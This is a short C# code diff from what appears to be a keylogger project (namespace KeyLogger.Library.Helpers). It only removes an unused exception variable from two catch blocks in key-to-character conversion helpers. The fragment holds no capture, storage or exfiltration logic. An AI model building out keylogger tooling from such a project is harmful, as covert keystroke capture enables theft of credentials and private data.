@@ -22,7 +22,7 @@ namespace KeyLogger.Library.Helpers
                 char keyChar = (char)kc.ConvertTo(key, typeof(char));
                 return keyChar;
 
-            } catch (Exception ex)
+            } catch (Exception)
             {
                 return char.MinValue;
             }
@@ -38,7 +38,7 @@ namespace KeyLogger.Library.Helpers
                 return keyChar.FirstOrDefault();
 
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 return char.MinValue;
             }
